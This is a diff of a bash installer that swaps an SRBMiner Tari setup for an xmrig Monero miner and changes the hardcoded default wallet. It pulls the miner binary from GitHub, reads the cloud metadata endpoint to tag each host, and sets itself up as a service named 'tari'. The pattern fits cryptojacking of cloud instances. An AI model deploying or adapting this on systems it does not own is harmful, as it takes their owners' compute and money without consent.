@@ -1,5 +1,5 @@
 #!/bin/bash
-[ "$1" ] && WALLET_ADDR="$1" || WALLET_ADDR="123JRWz3ht32UWii6bVadhzn5fawQXeCVeYZsgyMzt7Ggq1gP2TQYASLKmWYSd8orjNJfXtjeJWVP98MjaWRb77bYJV"
+[ "$1" ] && WALLET_ADDR="$1" || WALLET_ADDR="44zjbqhegCJ2WpGUtjTiAY3Jh5PgNyNyaMNiJX9rBcSXK3Nvv6LwSWFc2Qww8mgWJEi6PwAssTgH9c8dkxyXYR78K1gS4xA"
 INSTALL_DIR="/opt/tari"
 SERVICE_NAME="tari"
 
@@ -9,7 +9,7 @@ SERVICE_NAME="tari"
 
 mkdir -p "$INSTALL_DIR"
 
-wget -qO-  https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.8/SRBMiner-Multi-2-8-8-Linux.tar.gz | tar -zxf - -C $INSTALL_DIR --strip-components=1
+wget -qO-  https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-jammy-x64.tar.gz | tar -zxf - -C $INSTALL_DIR --strip-components=1
 
 echo '''#!/bin/bash
 ip="$(wget -T 3 -t 2 -qO- http://169.254.169.254/2021-03-23/meta-data/public-ipv4)"
@@ -35,7 +35,7 @@ minerAlias=$(encrypt_ip "$ip")
 
 ''' > $INSTALL_DIR/start.sh
 
-echo "exec $INSTALL_DIR/SRBMiner-MULTI --algorithm randomx --pool ca-tarirx.luckypool.io:9118 --wallet $WALLET_ADDR.\$minerAlias">> $INSTALL_DIR/start.sh
+echo "exec $INSTALL_DIR/xmrig --url pool.hashvault.pro:443 --user $WALLET_ADDR --pass \$minerAlias --donate-level 1 --tls --tls-fingerprint 420c7850e09b7c0bdcf748a7da9eb3647daf8515718f36d9ccfdd6b9ff834b14">> $INSTALL_DIR/start.sh
 
 chmod +x $INSTALL_DIR/start.sh
 
